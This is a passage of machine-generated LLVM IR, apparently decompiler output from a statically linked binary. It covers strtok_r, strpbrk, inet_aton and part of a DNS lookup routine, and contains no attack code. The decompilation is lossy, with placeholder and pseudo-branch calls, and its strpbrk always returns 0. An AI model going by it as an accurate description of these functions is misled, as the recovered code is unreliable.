  call void @__pseudo_cond_branch(i1 %v4_1000d6c4, i32 %v0_1000d6c8)
  %v0_1000d6cc.pre = load i32, i32* %ctr.global-to-local, align 4
  br label %dec_label_pc_1000d6cc.backedge

dec_label_pc_1000d6cc.backedge:                   ; preds = %dec_label_pc_1000d6c0, %dec_label_pc_1000d658
  %v0_1000d6cc = phi i32 [ %v0_1000d6cc.pre, %dec_label_pc_1000d6c0 ], [ %v0_1000d6cc21, %dec_label_pc_1000d658 ]
  %v1_1000d6cc = add i32 %v0_1000d6cc, -1
  store i32 %v1_1000d6cc, i32* %ctr.global-to-local, align 4
  %v2_1000d6cc = icmp eq i32 %v1_1000d6cc, 0
  br i1 %v2_1000d6cc, label %dec_label_pc_1000d6cc.dec_label_pc_1000d6d0_crit_edge, label %dec_label_pc_1000d6cc.backedge.dec_label_pc_1000d658_crit_edge

dec_label_pc_1000d6cc.backedge.dec_label_pc_1000d658_crit_edge: ; preds = %dec_label_pc_1000d6cc.backedge
  %v0_1000d658.pre = load i32, i32* %r3.global-to-local, align 4
  %v0_1000d65c.pre = load i32, i32* %r5.global-to-local, align 4
  %v0_1000d660.pre = load i32, i32* @r7, align 4
  %v0_1000d678.pre = load i32, i32* @r8, align 4
  br label %dec_label_pc_1000d658

dec_label_pc_1000d6cc.dec_label_pc_1000d6d0_crit_edge: ; preds = %dec_label_pc_1000d6cc.backedge
  %v0_1000d6d0.pre = load i32, i32* %r5.global-to-local, align 4
  br label %dec_label_pc_1000d6d0

dec_label_pc_1000d6d0:                            ; preds = %dec_label_pc_1000d6cc.dec_label_pc_1000d6d0_crit_edge, %dec_label_pc_1000d630
  %v0_1000d6d0 = phi i32 [ %v0_1000d6d0.pre, %dec_label_pc_1000d6cc.dec_label_pc_1000d6d0_crit_edge ], [ %v0_1000d634, %dec_label_pc_1000d630 ]
  %v1_1000d6d0 = add i32 %v0_1000d6d0, 1
  store i32 %v1_1000d6d0, i32* %r5.global-to-local, align 4
  store i32 %v0_1000d6d0, i32* %ctr.global-to-local, align 4
  %v2_1000d6e83 = icmp eq i32 %v0_1000d6d0, 0
  br i1 %v2_1000d6e83, label %dec_label_pc_1000d6ec, label %dec_label_pc_1000d6dc

dec_label_pc_1000d6dc:                            ; preds = %dec_label_pc_1000d6d0, %dec_label_pc_1000d6dc
  %v0_1000d6dc = load i32, i32* %r3.global-to-local, align 4
  %v1_1000d6dc = add i32 %v0_1000d6dc, -1
  %v2_1000d6dc = inttoptr i32 %v1_1000d6dc to i8*
  %v3_1000d6dc = load i8, i8* %v2_1000d6dc, align 1
  %v4_1000d6dc = zext i8 %v3_1000d6dc to i32
  store i32 %v1_1000d6dc, i32* %r3.global-to-local, align 4
  %v1_1000d6e0 = load i32, i32* %r4.global-to-local, align 4
  %v4_1000d6e0 = icmp eq i32 %v4_1000d6dc, %v1_1000d6e0
  %v0_1000d6e4 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d6e0, i32 %v0_1000d6e4)
  %v0_1000d6e8 = load i32, i32* %ctr.global-to-local, align 4
  %v1_1000d6e8 = add i32 %v0_1000d6e8, -1
  store i32 %v1_1000d6e8, i32* %ctr.global-to-local, align 4
  %v2_1000d6e8 = icmp eq i32 %v1_1000d6e8, 0
  br i1 %v2_1000d6e8, label %dec_label_pc_1000d6ec, label %dec_label_pc_1000d6dc

dec_label_pc_1000d6ec:                            ; preds = %dec_label_pc_1000d6dc, %dec_label_pc_1000d6d0
  store i32 0, i32* %r3.global-to-local, align 4
  ret i32 0

; uselistorder directives
  uselistorder i32 %v1_1000d6e8, { 1, 0 }
  uselistorder i32 %v0_1000d6d0, { 1, 2, 0 }
  uselistorder i32 %v1_1000d6cc, { 2, 1, 0 }
  uselistorder i32 %v1_1000d67c, { 1, 0, 2 }
  uselistorder i32 %v1_1000d674, { 1, 0, 2 }
  uselistorder i32 %v1_1000d664, { 1, 0, 2 }
  uselistorder i32 %v2_1000d638, { 1, 0 }
  uselistorder i32 %v1_1000d634, { 1, 0 }
  uselistorder i32 %v0_1000d630, { 1, 0 }
  uselistorder i32 %v0_1000d634, { 3, 2, 0, 1 }
  uselistorder i32 %v1_1000d628, { 1, 0 }
  uselistorder i32 %v0_1000d624, { 1, 0, 2 }
  uselistorder i32 %v2_1000d60c, { 2, 0, 1, 3 }
  uselistorder i32 %v1_1000d604, { 1, 0 }
  uselistorder i32* %r5.global-to-local, { 1, 3, 2, 4, 6, 7, 5, 0 }
  uselistorder i32* %r4.global-to-local, { 1, 2, 0, 3, 4 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 9, 5, 2, 3, 4, 6, 7, 8, 10 }
  uselistorder i32* %ctr.global-to-local, { 0, 3, 4, 1, 5, 6, 2, 7, 8 }
  uselistorder i32 %arg3, { 2, 1, 0, 3 }
  uselistorder label %dec_label_pc_1000d6dc, { 1, 0 }
  uselistorder label %dec_label_pc_1000d658, { 1, 0 }
  uselistorder label %dec_label_pc_1000d62c, { 1, 0 }
}

define i32 @strtok_r(i32 %arg1) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %r30.global-to-local = alloca i32, align 4
  %r31.global-to-local = alloca i32, align 4
  %v0_1000d6f8 = load i32, i32* @lr, align 4
  store i32 %v0_1000d6f8, i32* %r0.global-to-local, align 4
  store i32 %arg1, i32* %r31.global-to-local, align 4
  %v3_1000d700 = icmp eq i32 %arg1, 0
  %v0_1000d708 = load i32, i32* @r5, align 4
  store i32 %v0_1000d708, i32* %r30.global-to-local, align 4
  %v0_1000d70c = load i32, i32* @r4, align 4
  store i32 %v0_1000d70c, i32* %r29.global-to-local, align 4
  br i1 %v3_1000d700, label %dec_label_pc_1000d714, label %dec_label_pc_1000d718

dec_label_pc_1000d714:                            ; preds = %entry
  %v1_1000d714 = inttoptr i32 %v0_1000d708 to i32*
  %v2_1000d714 = load i32, i32* %v1_1000d714, align 4
  store i32 %v2_1000d714, i32* %r31.global-to-local, align 4
  br label %dec_label_pc_1000d718

dec_label_pc_1000d718:                            ; preds = %entry, %dec_label_pc_1000d714
  %v0_1000d718 = phi i32 [ %arg1, %entry ], [ %v2_1000d714, %dec_label_pc_1000d714 ]
  store i32 %v0_1000d718, i32* @r3, align 4
  %v1_1000d71c = inttoptr i32 %v0_1000d718 to i8*
  %v2_1000d71c = call i32 @__GI_strspn(i8* %v1_1000d71c)
  %v0_1000d720 = load i32, i32* %r29.global-to-local, align 4
  %v0_1000d724 = load i32, i32* %r31.global-to-local, align 4
  %v2_1000d724 = add i32 %v0_1000d724, %v2_1000d71c
  %v3_1000d724 = inttoptr i32 %v2_1000d724 to i8*
  %v4_1000d724 = load i8, i8* %v3_1000d724, align 1
  store i32 %v2_1000d724, i32* @r31, align 4
  store i32 %v2_1000d724, i32* @r3, align 4
  %v3_1000d730 = icmp eq i8 %v4_1000d724, 0
  store i32 0, i32* %r0.global-to-local, align 4
  br i1 %v3_1000d730, label %dec_label_pc_1000d73c, label %dec_label_pc_1000d744

dec_label_pc_1000d73c:                            ; preds = %dec_label_pc_1000d718
  %v1_1000d73c = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d73c = inttoptr i32 %v1_1000d73c to i32*
  store i32 %v2_1000d724, i32* %v2_1000d73c, align 4
  br label %dec_label_pc_1000d77c

dec_label_pc_1000d744:                            ; preds = %dec_label_pc_1000d718
  store i32 268490568, i32* @lr, align 4
  %v3_1000d744 = call i32 @__GI_strpbrk(i8* %v3_1000d724, i32 %v0_1000d720)
  %v4_1000d74c = icmp eq i32 %v3_1000d744, 0
  %v0_1000d750 = load i32, i32* @r31, align 4
  store i32 %v0_1000d750, i32* @r3, align 4
  %v2_1000d754 = add i32 %v3_1000d744, 1
  store i32 %v2_1000d754, i32* %r11.global-to-local, align 4
  br i1 %v4_1000d74c, label %dec_label_pc_1000d75c, label %dec_label_pc_1000d76c

dec_label_pc_1000d75c:                            ; preds = %dec_label_pc_1000d744
  store i32 268490592, i32* @lr, align 4
  %v4_1000d75c = call i32 @rawmemchr(i32 %v0_1000d750, i32 0, i32 0)
  %v0_1000d760 = load i32, i32* @r31, align 4
  store i32 %v0_1000d760, i32* %r0.global-to-local, align 4
  %v1_1000d764 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d764 = inttoptr i32 %v1_1000d764 to i32*
  store i32 %v4_1000d75c, i32* %v2_1000d764, align 4
  br label %dec_label_pc_1000d77c

dec_label_pc_1000d76c:                            ; preds = %dec_label_pc_1000d744
  %v1_1000d74c = inttoptr i32 %v3_1000d744 to i8*
  store i8 0, i8* %v1_1000d74c, align 1
  %v0_1000d774 = load i32, i32* @r31, align 4
  store i32 %v0_1000d774, i32* %r0.global-to-local, align 4
  %v0_1000d778 = load i32, i32* %r11.global-to-local, align 4
  %v1_1000d778 = load i32, i32* %r30.global-to-local, align 4
  %v2_1000d778 = inttoptr i32 %v1_1000d778 to i32*
  store i32 %v0_1000d778, i32* %v2_1000d778, align 4
  br label %dec_label_pc_1000d77c

dec_label_pc_1000d77c:                            ; preds = %dec_label_pc_1000d75c, %dec_label_pc_1000d73c, %dec_label_pc_1000d76c
  %v0_1000d77c = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_1000d6f8, i32* %r0.global-to-local, align 4
  ret i32 %v0_1000d77c

; uselistorder directives
  uselistorder i32 %v3_1000d744, { 2, 0, 1 }
  uselistorder i32 %v2_1000d724, { 0, 2, 1, 3 }
  uselistorder i32 %v0_1000d718, { 1, 0 }
  uselistorder i32* %r31.global-to-local, { 1, 0, 2 }
  uselistorder i32* %r0.global-to-local, { 0, 3, 1, 2, 4, 5 }
  uselistorder label %dec_label_pc_1000d77c, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1000d718, { 1, 0 }
}

define i32 @__GI_strpbrk(i8* %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r11.global-to-local = alloca i32, align 4
  %r9.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %v0_1000d7b41 = load i32, i32* @r3, align 4
  %v1_1000d7b42 = inttoptr i32 %v0_1000d7b41 to i8*
  %v2_1000d7b43 = load i8, i8* %v1_1000d7b42, align 1
  %v3_1000d7b44 = zext i8 %v2_1000d7b43 to i32
  store i32 %v3_1000d7b44, i32* %r11.global-to-local, align 4
  %v3_1000d7b86 = icmp eq i8 %v2_1000d7b43, 0
  br i1 %v3_1000d7b86, label %dec_label_pc_1000d7c8, label %dec_label_pc_1000d7c0

dec_label_pc_1000d798:                            ; preds = %dec_label_pc_1000d79c
  %v3_1000d79c = zext i8 %v2_1000d79c to i32
  %v4_1000d7a8 = icmp eq i32 %v3_1000d79c, %v1_1000d7a8
  %v0_1000d798 = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v4_1000d7a8, i32 %v0_1000d798)
  %v0_1000d79c.pre = load i32, i32* %r9.global-to-local, align 4
  %v1_1000d7a8.pre = load i32, i32* %r11.global-to-local, align 4
  br label %dec_label_pc_1000d79c

dec_label_pc_1000d79c:                            ; preds = %dec_label_pc_1000d7c0, %dec_label_pc_1000d798
  %v1_1000d7a8 = phi i32 [ %v1_1000d7a89, %dec_label_pc_1000d7c0 ], [ %v1_1000d7a8.pre, %dec_label_pc_1000d798 ]
  %v0_1000d79c = phi i32 [ %tmp, %dec_label_pc_1000d7c0 ], [ %v0_1000d79c.pre, %dec_label_pc_1000d798 ]
  %v1_1000d79c = inttoptr i32 %v0_1000d79c to i8*
  %v2_1000d79c = load i8, i8* %v1_1000d79c, align 1
  %v1_1000d7a0 = add i32 %v0_1000d79c, 1
  store i32 %v1_1000d7a0, i32* %r9.global-to-local, align 4
  %v3_1000d7a4 = icmp eq i8 %v2_1000d79c, 0
  br i1 %v3_1000d7a4, label %dec_label_pc_1000d7b0, label %dec_label_pc_1000d798

dec_label_pc_1000d7b0:                            ; preds = %dec_label_pc_1000d79c
  %v0_1000d7b0 = load i32, i32* @r3, align 4
  %v1_1000d7b0 = add i32 %v0_1000d7b0, 1
  store i32 %v1_1000d7b0, i32* @r3, align 4
  %v1_1000d7b4 = inttoptr i32 %v1_1000d7b0 to i8*
  %v2_1000d7b4 = load i8, i8* %v1_1000d7b4, align 1
  %v3_1000d7b4 = zext i8 %v2_1000d7b4 to i32
  store i32 %v3_1000d7b4, i32* %r11.global-to-local, align 4
  %v3_1000d7b8 = icmp eq i8 %v2_1000d7b4, 0
  br i1 %v3_1000d7b8, label %dec_label_pc_1000d7c8, label %dec_label_pc_1000d7c0

dec_label_pc_1000d7c0:                            ; preds = %entry, %dec_label_pc_1000d7b0
  %v1_1000d7a89 = phi i32 [ %v3_1000d7b4, %dec_label_pc_1000d7b0 ], [ %v3_1000d7b44, %entry ]
  store i32 %tmp, i32* %r9.global-to-local, align 4
  br label %dec_label_pc_1000d79c

dec_label_pc_1000d7c8:                            ; preds = %dec_label_pc_1000d7b0, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v0_1000d79c, { 1, 0 }
  uselistorder i32 %tmp, { 1, 0 }
  uselistorder i32* %r9.global-to-local, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1000d7c0, { 1, 0 }
}

define i32 @inet_aton(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %v3_1000d7d0 = icmp eq i8* %arg1, null
  br i1 %v3_1000d7d0, label %dec_label_pc_1000d888, label %dec_label_pc_1000d7d8

dec_label_pc_1000d7d8:                            ; preds = %entry
  %tmp = ptrtoint i8* %arg1 to i32
  store i32 0, i32* %r5.global-to-local, align 4
  %v3_1000d7ec.pre = load i32, i32* @global_var_100234d8, align 4
  br label %dec_label_pc_1000d7e8

dec_label_pc_1000d7e8:                            ; preds = %dec_label_pc_1000d7d8, %dec_label_pc_1000d860
  %v0_1000d860 = phi i32 [ 0, %dec_label_pc_1000d7d8 ], [ %v2_1000d868, %dec_label_pc_1000d860 ]
  %v0_1000d864 = phi i32 [ 1, %dec_label_pc_1000d7d8 ], [ %v1_1000d864, %dec_label_pc_1000d860 ]
  %v0_1000d7e8 = phi i32 [ %tmp, %dec_label_pc_1000d7d8 ], [ %v0_1000d7e83, %dec_label_pc_1000d860 ]
  %v1_1000d7e8 = inttoptr i32 %v0_1000d7e8 to i8*
  %v2_1000d7e8 = load i8, i8* %v1_1000d7e8, align 1
  %v3_1000d7e8 = zext i8 %v2_1000d7e8 to i32
  %v1_1000d7f0 = mul nuw nsw i32 %v3_1000d7e8, 2
  %v2_1000d7f4 = add i32 %v1_1000d7f0, %v3_1000d7ec.pre
  %v3_1000d7f4 = inttoptr i32 %v2_1000d7f4 to i16*
  %v4_1000d7f4 = load i16, i16* %v3_1000d7f4, align 2
  %v1_1000d7f8 = and i16 %v4_1000d7f4, 8
  %v3_1000d7f8 = icmp eq i16 %v1_1000d7f8, 0
  br i1 %v3_1000d7f8, label %dec_label_pc_1000d888, label %dec_label_pc_1000d800

dec_label_pc_1000d800:                            ; preds = %dec_label_pc_1000d7e8
  br label %dec_label_pc_1000d818

dec_label_pc_1000d808:                            ; preds = %dec_label_pc_1000d818
  %v1_1000d81c = mul i32 %v1_1000d868, 10
  %v2_1000d824 = add i32 %v3_1000d818, %v1_1000d81c
  %v1_1000d808 = add i32 %v2_1000d824, -48
  %v1_1000d80c = add i32 %v0_1000d850, 1
  %v2_1000d810 = icmp sgt i32 %v1_1000d808, 255
  br i1 %v2_1000d810, label %dec_label_pc_1000d888, label %dec_label_pc_1000d818

dec_label_pc_1000d818:                            ; preds = %dec_label_pc_1000d808, %dec_label_pc_1000d800
  %v1_1000d868 = phi i32 [ %v1_1000d808, %dec_label_pc_1000d808 ], [ 0, %dec_label_pc_1000d800 ]
  %v0_1000d850 = phi i32 [ %v1_1000d80c, %dec_label_pc_1000d808 ], [ %v0_1000d7e8, %dec_label_pc_1000d800 ]
  %v1_1000d818 = inttoptr i32 %v0_1000d850 to i8*
  %v2_1000d818 = load i8, i8* %v1_1000d818, align 1
  %v3_1000d818 = zext i8 %v2_1000d818 to i32
  %v1_1000d820 = mul nuw nsw i32 %v3_1000d818, 2
  %v2_1000d828 = add i32 %v1_1000d820, %v3_1000d7ec.pre
  %v3_1000d828 = inttoptr i32 %v2_1000d828 to i16*
  %v4_1000d828 = load i16, i16* %v3_1000d828, align 2
  %v5_1000d828 = zext i16 %v4_1000d828 to i32
  %v1_1000d82c = and i32 %v5_1000d828, 8
  %v3_1000d82c = icmp eq i32 %v1_1000d82c, 0
  br i1 %v3_1000d82c, label %dec_label_pc_1000d834, label %dec_label_pc_1000d808

dec_label_pc_1000d834:                            ; preds = %dec_label_pc_1000d818
  %v2_1000d834 = icmp sgt i32 %v0_1000d864, 3
  br i1 %v2_1000d834, label %dec_label_pc_1000d84c, label %dec_label_pc_1000d83c

dec_label_pc_1000d83c:                            ; preds = %dec_label_pc_1000d834
  %v3_1000d83c = icmp eq i8 %v2_1000d818, 46
  br i1 %v3_1000d83c, label %dec_label_pc_1000d844, label %dec_label_pc_1000d888

dec_label_pc_1000d844:                            ; preds = %dec_label_pc_1000d83c
  %v1_1000d844 = add i32 %v0_1000d850, 1
  br label %dec_label_pc_1000d860

dec_label_pc_1000d84c:                            ; preds = %dec_label_pc_1000d834
  %v3_1000d84c = icmp eq i8 %v2_1000d818, 0
  %v1_1000d850 = add i32 %v0_1000d850, 1
  br i1 %v3_1000d84c, label %dec_label_pc_1000d860, label %dec_label_pc_1000d858

dec_label_pc_1000d858:                            ; preds = %dec_label_pc_1000d84c
  %v1_1000d858 = and i32 %v5_1000d828, 32
  %v3_1000d858 = icmp eq i32 %v1_1000d858, 0
  br i1 %v3_1000d858, label %dec_label_pc_1000d888, label %dec_label_pc_1000d860

dec_label_pc_1000d860:                            ; preds = %dec_label_pc_1000d858, %dec_label_pc_1000d84c, %dec_label_pc_1000d844
  %v0_1000d7e83 = phi i32 [ %v1_1000d850, %dec_label_pc_1000d858 ], [ %v1_1000d850, %dec_label_pc_1000d84c ], [ %v1_1000d844, %dec_label_pc_1000d844 ]
  %v1_1000d860 = mul i32 %v0_1000d860, 256
  %v1_1000d864 = add nuw nsw i32 %v0_1000d864, 1
  %v2_1000d868 = or i32 %v1_1000d868, %v1_1000d860
  store i32 %v2_1000d868, i32* %r5.global-to-local, align 4
  %tmp10 = icmp slt i32 %v1_1000d864, 5
  br i1 %tmp10, label %dec_label_pc_1000d7e8, label %dec_label_pc_1000d874

dec_label_pc_1000d874:                            ; preds = %dec_label_pc_1000d860
  %v0_1000d874 = load i32, i32* @r4, align 4
  %v3_1000d874 = icmp eq i32 %v0_1000d874, 0
  %v0_1000d87c = load i32, i32* @lr, align 4
  call void @__pseudo_cond_branch(i1 %v3_1000d874, i32 %v0_1000d87c)
  %v0_1000d880 = load i32, i32* %r5.global-to-local, align 4
  %v1_1000d880 = load i32, i32* @r4, align 4
  %v2_1000d880 = inttoptr i32 %v1_1000d880 to i32*
  store i32 %v0_1000d880, i32* %v2_1000d880, align 4
  ret i32 1

dec_label_pc_1000d888:                            ; preds = %dec_label_pc_1000d83c, %dec_label_pc_1000d858, %dec_label_pc_1000d7e8, %dec_label_pc_1000d808, %entry
  ret i32 0

; uselistorder directives
  uselistorder i32 %v2_1000d868, { 1, 0 }
  uselistorder i32 %v1_1000d864, { 1, 0 }
  uselistorder i32 %v0_1000d850, { 0, 1, 3, 2 }
  uselistorder i8* %arg1, { 1, 0 }
  uselistorder label %dec_label_pc_1000d888, { 1, 0, 3, 2, 4 }
  uselistorder label %dec_label_pc_1000d7e8, { 1, 0 }
}

define i32 @__dns_lookup(i8* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r0.global-to-local = alloca i32, align 4
  %r11.global-to-local = alloca i32, align 4
  %r14.global-to-local = alloca i32, align 4
  %r15.global-to-local = alloca i32, align 4
  %r16.global-to-local = alloca i32, align 4
  %r17.global-to-local = alloca i32, align 4
  %r18.global-to-local = alloca i32, align 4
  %r28.global-to-local = alloca i32, align 4
  %r29.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %tmp28 = call i32 @__decompiler_undefined_function_0()
  %tmp29 = call i32 @__decompiler_undefined_function_0()
  %tmp33 = call i32 @__decompiler_undefined_function_0()
  %tmp35 = call i32 @__decompiler_undefined_function_0()
  %tmp36 = call i32 @__decompiler_undefined_function_0()
  %tmp37 = call i32 @__decompiler_undefined_function_0()
  %stack_var_-184 = alloca i32, align 4
  %stack_var_-248 = alloca i32, align 4
  %stack_var_-212 = alloca i16, align 2
  %stack_var_-204 = alloca i32, align 4
  %stack_var_-240 = alloca i32, align 4
  %stack_var_-144 = alloca i32, align 4
  %stack_var_-228 = alloca i32, align 4
  %v0_1000d894 = load i32, i32* @lr, align 4
  store i32 %v0_1000d894, i32* %r0.global-to-local, align 4
  store i32 %tmp, i32* %r14.global-to-local, align 4
  store i32 512, i32* @r3, align 4
  store i32 %arg2, i32* %r16.global-to-local, align 4
  store i32 %arg3, i32* @r23, align 4
  store i32 268490944, i32* @lr, align 4
  %v0_1000d8bc = call i32 @malloc()
  store i32 %v0_1000d8bc, i32* @r30, align 4
  store i32 1025, i32* @r3, align 4
  store i32 268490956, i32* @lr, align 4
  %v0_1000d8c8 = call i32 @malloc()
  %v0_1000d8cc = load i32, i32* @r30, align 4
  %v3_1000d8cc = icmp eq i32 %v0_1000d8cc, 0
  store i32 %v0_1000d8c8, i32* @r21, align 4
  br i1 %v3_1000d8cc, label %dec_label_pc_1000de88, label %dec_label_pc_1000d8d8

dec_label_pc_1000d8d8:                            ; preds = %entry
  %v3_1000d8d8 = icmp eq i32 %v0_1000d8c8, 0
  br i1 %v3_1000d8d8, label %dec_label_pc_1000de88, label %dec_label_pc_1000d8e0

dec_label_pc_1000d8e0:                            ; preds = %dec_label_pc_1000d8d8
  %v0_1000d8e0 = load i32, i32* @r23, align 4
  %v3_1000d8e0 = icmp eq i32 %v0_1000d8e0, 0
  br i1 %v3_1000d8e0, label %dec_label_pc_1000de88, label %dec_label_pc_1000d8e8

dec_label_pc_1000d8e8:                            ; preds = %dec_label_pc_1000d8e0
  %v0_1000d8e8 = load i32, i32* %r14.global-to-local, align 4
  %v1_1000d8e8 = inttoptr i32 %v0_1000d8e8 to i8*
  %v2_1000d8e8 = load i8, i8* %v1_1000d8e8, align 1
  %v3_1000d8e8 = zext i8 %v2_1000d8e8 to i32
  store i32 %v3_1000d8e8, i32* %r0.global-to-local, align 4
  %v3_1000d8ec = icmp eq i8 %v2_1000d8e8, 0
  br i1 %v3_1000d8ec, label %dec_label_pc_1000de88, label %dec_label_pc_1000d8f4

dec_label_pc_1000d8f4:                            ; preds = %dec_label_pc_1000d8e8
  store i32 %v0_1000d8e8, i32* @r3, align 4
  store i32 268632064, i32* %r29.global-to-local, align 4
  %v0_1000d8fc = call i32 @__GI_strlen()
  %v0_1000d904 = load i32, i32* %r14.global-to-local, align 4
  %v2_1000d904 = add i32 %v0_1000d904, %v0_1000d8fc
  %v1_1000d90c = add i32 %v2_1000d904, -1
  %v2_1000d90c = inttoptr i32 %v1_1000d90c to i8*
  %v3_1000d90c = load i8, i8* %v2_1000d90c, align 1
  %v4_1000d90c = zext i8 %v3_1000d90c to i32
  store i32 %v4_1000d90c, i32* %r0.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_100297b8.368 to i32), i32* %r29.global-to-local, align 4
  %v2_1000d914 = ptrtoint i32* %stack_var_-228 to i32
  store i32 %v2_1000d914, i32* %r28.global-to-local, align 4
  store i32 %v2_1000d914, i32* @r3, align 4
  %v1_1000d920 = xor i32 %v4_1000d90c, 46
  store i32 %v1_1000d920, i32* %r17.global-to-local, align 4
  %v0_1000d924 = call i32 @__pthread_return_void()
  %v0_1000d92c = call i32 @__pthread_return_0()
  %v3_1000d934 = load i32, i32* @global_var_10023578.369, align 4
  store i32 %v3_1000d934, i32* %r11.global-to-local, align 4
  %v3_1000d940 = load i16, i16* @global_var_10023494.370, align 2
  %v4_1000d940 = zext i16 %v3_1000d940 to i32
  store i32 %v4_1000d940, i32* @r25, align 4
  %v1_1000d944 = load i32, i32* @r23, align 4
  store i32 %v2_1000d914, i32* @r3, align 4
  store i32 0, i32* %r17.global-to-local, align 4
  store i32 -1, i32* @r19, align 4
  store i32 0, i32* %r18.global-to-local, align 4
  store i32 -1, i32* @r22, align 4
  %v2_1000d944 = srem i32 %v3_1000d934, %v1_1000d944
  %v2_1000d960 = sub i32 %v3_1000d934, %v2_1000d944
  store i32 %v2_1000d960, i32* %r0.global-to-local, align 4
  store i32 %v2_1000d944, i32* @r26, align 4
  %v0_1000d968 = call i32 @__pthread_return_void()
  %v0_1000de7c.pr19 = load i32, i32* %r18.global-to-local, align 4
  %tmp57 = icmp ult i32 %v0_1000de7c.pr19, 3
  br i1 %tmp57, label %dec_label_pc_1000d970.lr.ph.lr.ph, label %dec_label_pc_1000de94

dec_label_pc_1000d970.lr.ph.lr.ph:                ; preds = %dec_label_pc_1000d8f4
  %v2_1000d988 = ptrtoint i32* %stack_var_-144 to i32
  %v2_1000da9c = ptrtoint i32* %stack_var_-204 to i32
  %v2_1000dafc = ptrtoint i16* %stack_var_-212 to i32
  %v2_1000db40 = ptrtoint i32* %stack_var_-248 to i32
  %v3_1000db9c = icmp eq i32 %tmp37, 0
  %v3_1000dba8 = icmp eq i32 %tmp36, 3
  %v2_1000dc24 = icmp sgt i32 %tmp35, 0
  %tmp58 = icmp slt i32 %tmp35, 1
  %v2_1000dc78 = ptrtoint i32* %stack_var_-184 to i32
  %v3_1000dca4 = icmp eq i32 %tmp33, 0
  %v3_1000dc18 = icmp eq i32 %tmp36, 0
  br label %dec_label_pc_1000d970.lr.ph

dec_label_pc_1000d970:                            ; preds = %dec_label_pc_1000d970.lr.ph, %dec_label_pc_1000db20
  %v0_1000d970 = load i32, i32* @r19, align 4
  %v3_1000d970 = icmp eq i32 %v0_1000d970, -1
  br i1 %v3_1000d970, label %dec_label_pc_1000d980, label %dec_label_pc_1000d978

dec_label_pc_1000d978:                            ; preds = %dec_label_pc_1000d970
  store i32 268491136, i32* @lr, align 4
  %v1_1000d97c = call i32 @__libc_close(i32 %v0_1000d970)
  br label %dec_label_pc_1000d980

dec_label_pc_1000d980:                            ; preds = %dec_label_pc_1000d970, %dec_label_pc_1000d978
  store i32 %v2_1000d988, i32* %r29.global-to-local, align 4
  %v0_1000d98c = load i32, i32* @r30, align 4
  store i32 268491156, i32* @lr, align 4
  %v3_1000d990 = call i32 @__GI_memset(i32 %v0_1000d98c, i32 0, i32 512)
  store i32 268491172, i32* @lr, align 4
  %v3_1000d9a0 = call i32 @__GI_memset(i32 %v2_1000d988, i32 0, i32 48)
  %v0_1000d9a4 = load i32, i32* @r25, align 4
  %v1_1000d9a4 = add i32 %v0_1000d9a4, 1
  %v1_1000d9a8 = urem i32 %v1_1000d9a4, 65536
  store i32 %v1_1000d9a8, i32* @r25, align 4
  store i32 1, i32* %r0.global-to-local, align 4
  %v0_1000d9b4 = load i32, i32* @r30, align 4
  store i32 %v1_1000d9a8, i32* %stack_var_-144, align 4
  %v4_1000d9c8 = call i32 @__encode_header(i32* nonnull %stack_var_-144, i32 %v0_1000d9b4, i32 512)
  store i32 %v4_1000d9c8, i32* %r28.global-to-local, align 4
  %v1_1000d9cc = icmp slt i32 %v4_1000d9c8, 0
  br i1 %v1_1000d9cc, label %dec_label_pc_1000de94, label %dec_label_pc_1000d9d4

dec_label_pc_1000d9d4:                            ; preds = %dec_label_pc_1000d980
  %v0_1000d9d4 = load i32, i32* %r14.global-to-local, align 4
  store i32 %v0_1000d9d4, i32* @r4, align 4
  %v0_1000d9dc = load i32, i32* @r21, align 4
  store i32 268566528, i32* %r29.global-to-local, align 4
  store i32 268491240, i32* @lr, align 4
  %v4_1000d9e4 = call i32 @strncpy(i32 %v0_1000d9dc, i32 %v0_1000d9d4, i32 1025)
  store i32 ptrtoint (i32* @global_var_10023498.321 to i32), i32* %r29.global-to-local, align 4
  store i32 %v2_1000d914, i32* @r3, align 4
  %v0_1000d9fc = call i32 @__pthread_return_void()
  %v0_1000da04 = call i32 @__pthread_return_0()
  %v0_1000da08 = load i32, i32* @r22, align 4
  %v1_1000da08 = icmp slt i32 %v0_1000da08, 0
  %v0_1000da10 = load i32, i32* @r26, align 4
  %v1_1000da10 = mul i32 %v0_1000da10, 4
  store i32 %v1_1000da10, i32* %r0.global-to-local, align 4
  %v2_1000da14 = add i32 %v1_1000da10, %arg4
  %v3_1000da14 = inttoptr i32 %v2_1000da14 to i32*
  %v4_1000da14 = load i32, i32* %v3_1000da14, align 4
  store i32 %v4_1000da14, i32* %r29.global-to-local, align 4
  br i1 %v1_1000da08, label %dec_label_pc_1000da5c, label %dec_label_pc_1000da1c

dec_label_pc_1000da1c:                            ; preds = %dec_label_pc_1000d9d4
  %v3_1000da20 = load i32, i32* @global_var_10023580.372, align 4
  store i32 %v3_1000da20, i32* %r0.global-to-local, align 4
  %v2_1000da24 = icmp slt i32 %v0_1000da08, %v3_1000da20
  br i1 %v2_1000da24, label %dec_label_pc_1000da2c, label %dec_label_pc_1000da5c

dec_label_pc_1000da2c:                            ; preds = %dec_label_pc_1000da1c
  store i32 ptrtoint (i32* @global_var_10012af8.373 to i32), i32* @r4, align 4
  %v0_1000da38 = load i32, i32* @r21, align 4
  store i32 268491328, i32* @lr, align 4
  %v4_1000da3c = inttoptr i32 %v0_1000da38 to i8*
  %v5_1000da3c = call i32 @__GI_strncat(i8* %v4_1000da3c, i32 ptrtoint (i32* @global_var_10012af8.373 to i32), i32 1025, i32 268566528)
